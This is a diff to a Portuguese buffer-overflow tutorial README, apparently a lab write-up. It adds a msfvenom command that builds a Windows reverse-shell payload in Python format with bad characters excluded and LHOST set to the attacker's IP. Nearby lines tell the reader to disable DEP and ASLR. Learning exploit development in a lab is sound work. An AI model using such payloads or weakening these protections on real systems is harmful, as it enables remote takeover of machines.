@@ -165,6 +165,18 @@ iremos usar o { windows/shell_reverse_tcp  } 32bits porque o nosso programa vuln
 { msfvenom -p windows/shell_reverse_tcp --list-options  }
 para verficar as opções do payload!
 
+![Screenshot from 2023-08-24 22-04-54](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/99afb70a-5073-4f7e-bf89-c8cfdeb23f91)
+
+podemos ver que falta apenas a opção LHOST ser preenchida, ali vai o ip da sua maquina!
+
+-f	 { o formato será em python poque nosso exploit está escrito em python }
+-b	 {bad chars que devem ser evitados, onde entra os que foram encontrados por nós }
+
+{  msfvenom -p windows/shell_reverse_tcp LHOST=000.000.0.000 -f py -b '\x00\x09\x0a\x1a'  }
+
+![Screenshot from 2023-08-24 22-17-44](https://github.com/igusil/buff3r_ov3rflow/assets/89313216/5d9aea5f-f401-4e03-9d1d-bbb5f5c2fc8a)
+
+
 Ps.: Desativar o DEP (Data Execution Prevention) e ASLR (Address Space Layout Randomization)
 
 DEP: cli como admin e digite: bdcedit.exe /set {current} nx AlwaysOff
